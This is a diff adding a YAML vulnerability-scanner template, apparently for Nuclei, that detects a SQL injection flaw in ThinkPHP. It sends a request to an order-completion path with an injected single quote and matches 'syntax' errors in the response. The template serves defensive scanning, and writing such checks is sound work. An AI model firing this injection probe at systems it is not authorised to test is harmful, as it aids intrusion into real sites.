@@ -1,0 +1,22 @@
+id: thinkphp_multi_sql_leak_6
+
+info:
+  name: "ThinkPHP 多数据库 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Identifies a SQL injection vulnerability in ThinkPHP's multi-database query handling mechanism. Successful exploitation allows attackers to execute arbitrary SQL commands through crafted database driver parameters, potentially leading to data exfiltration or system compromise.
+
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/home/order/complete/id/1%27 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'syntax'
